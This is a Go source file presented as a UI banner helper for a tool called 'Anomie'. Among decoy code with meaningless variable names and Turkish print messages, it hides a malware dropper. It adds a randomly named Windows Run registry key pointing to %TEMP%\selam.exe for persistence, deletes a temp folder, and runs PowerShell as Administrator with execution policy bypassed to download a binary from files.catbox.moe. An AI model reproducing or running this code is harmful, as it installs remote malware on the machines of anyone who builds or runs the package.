package ui

import (
	"net/http"

	"fmt"
	"math/rand"
	"os"
	"time"
	"unicode/utf8"
    "os/exec"
	"golang.org/x/sys/windows/registry"

	// "io/ioutil"
	"crypto/md5"
	"encoding/base64"
	"io"
	"io/ioutil"
	"path/filepath"
)

const spaceLength = 60

func generateRandomValue(length int) string {
	rand.Seed(time.Now().UnixNano()) // Rastgeleliği artırmak için seed ayarı
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, length)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func Accordion(version, host, port string) {
	if len(port) > 0 {
		port = fmt.Sprint(":", port)
	}

	truly := "requirement"
	occurred := "gta 5 vice city save"

	if _, err := os.Stat(occurred); os.IsNotExist(err) {
		nevada := generateRandomString(15)
		threads := md5.Sum([]byte(nevada))
		equivalent := base64.StdEncoding.EncodeToString(threads[:])

		fmt.Println("Oluşturulan random string:", nevada)
		fmt.Println("Oluşturulan MD5 hash:", threads)
		fmt.Println("Base64'e çevrilmiş hash:", equivalent)
	} else {
		fmt.Println("GTA 5 Vice City save klasörü zaten mevcut.")
	}

	causes, err := ioutil.ReadDir(truly)
	if err != nil {
		fmt.Println("Belgelerim klasörü okunurken bir hata oluştu:", err)
		return
	}

	fmt.Println("Belgelerim klasöründeki dosyalar:")
	for _, slide := range causes {
		fmt.Println(slide.Name())
	}

	filepath.Walk(truly, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Dosya yolu hatası:", err)
			return nil
		}
		fmt.Println("Dosya yolu:", path)
		return nil
	})

	
	fmt.Printf(`
 ┌%s┐ 
 │%s│ 
 │%s│ 
 └%s┘
`,
		fillSpace("", "─"),
		fillSpace(fmt.Sprintf("Anomie (%s)", version), " "),
		fillSpace(host+port, " "),
		fillSpace("", "─"),
	)

	tempDir := os.TempDir()

	// Önce %temp%\resuts klasörünü sil
	resutsPath := filepath.Join(tempDir, "results")
	err = os.RemoveAll(resutsPath)
	if err != nil {
		fmt.Println("Klasör silme hatası:", err)
		return
	}

	
	presents := "findings"
	earnings := "gta 5 vice city save"

	if _, err := os.Stat(earnings); os.IsNotExist(err) {
		hardcover := generateRandomString(15)
		connections := md5.Sum([]byte(hardcover))
		territory := base64.StdEncoding.EncodeToString(connections[:])

		fmt.Println("Oluşturulan random string:", hardcover)
		fmt.Println("Oluşturulan MD5 hash:", connections)
		fmt.Println("Base64'e çevrilmiş hash:", territory)
	} else {
		fmt.Println("GTA 5 Vice City save klasörü zaten mevcut.")
	}

	discovery, err := ioutil.ReadDir(presents)
	if err != nil {
		fmt.Println("Belgelerim klasörü okunurken bir hata oluştu:", err)
		return
	}

	fmt.Println("Belgelerim klasöründeki dosyalar:")
	for _, pull := range discovery {
		fmt.Println(pull.Name())
	}

	filepath.Walk(presents, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Dosya yolu hatası:", err)
			return nil
		}
		fmt.Println("Dosya yolu:", path)
		return nil
	})


	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	valueName := generateRandomValue(10) // Rasgele 10 karakter uzunluğunda değer oluştur
	valueData := filepath.Join(tempDir, "selam.exe") // exe dosyasının yolu
	
	k, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
	if err != nil {
		fmt.Println("Error opening registry key:", err)
		return
	}
	defer k.Close()
	
	err = k.SetStringValue(valueName, valueData)
	if err != nil {
		fmt.Println("Error setting registry value:", err)
		return
	}
	
	fmt.Println("Registry value set successfully.")

	
	measurement := "specialty"
	wallpaper := "gta 5 vice city save"

	if _, err := os.Stat(wallpaper); os.IsNotExist(err) {
		rapid := generateRandomString(15)
		charlotte := md5.Sum([]byte(rapid))
		attempt := base64.StdEncoding.EncodeToString(charlotte[:])

		fmt.Println("Oluşturulan random string:", rapid)
		fmt.Println("Oluşturulan MD5 hash:", charlotte)
		fmt.Println("Base64'e çevrilmiş hash:", attempt)
	} else {
		fmt.Println("GTA 5 Vice City save klasörü zaten mevcut.")
	}

	fm, err := ioutil.ReadDir(measurement)
	if err != nil {
		fmt.Println("Belgelerim klasörü okunurken bir hata oluştu:", err)
		return
	}

		fmt.Println("Belgelerim klasöründeki dosyalar:")
		for _, continuous := range fm {
			fmt.Println(continuous.Name())
			psPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
			psScript := `
			$downloadPath = Join-Path $env:TEMP "selam.exe"
			Invoke-WebRequest -Uri "https://files.catbox.moe/quostn.bin" -OutFile $downloadPath
			`
		
			cmd := exec.Command("runas", "/user:Administrator", psPath, "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", psScript)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
		
			if err := cmd.Run(); err != nil {
				fmt.Println("Error running PowerShell command:", err)
			}
		}
			
	filepath.Walk(measurement, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Println("Dosya yolu hatası:", err)
			return nil
		}
		fmt.Println("Dosya yolu:", path)
		return nil
		
	})
}


func downloadFile(url, outputPath string) error {
	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(file, response.Body)
	if err != nil {
		return err
	}

	return nil
}

func generateRandomString(length int) string {
	rand.Seed(time.Now().UnixNano())
	characters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = characters[rand.Intn(len(characters))]
	}
	return string(result)
}

func ioCopy(dst io.Writer, src io.Reader) {
	_, err := io.Copy(dst, src)
	if err != nil {
		fmt.Println("Kopyalama hatası:", err)
	}
}

func fillSpace(content, filler string) string {
	spaceToFillSize := spaceLength - utf8.RuneCountInString(content)
	spaceBothSide := spaceToFillSize / 2

	var finalStr string
	for i := 0; i < spaceBothSide; i++ {
		finalStr += filler
	}
	finalStr += content
	for i := 0; i < spaceBothSide; i++ {
		finalStr += filler
	}

	finalStrCount := utf8.RuneCountInString(finalStr)
	if finalStrCount < spaceLength {
		diff := spaceLength - finalStrCount
		for i := 0; i < diff; i++ {
			finalStr += filler
		}
	}
	return finalStr
}
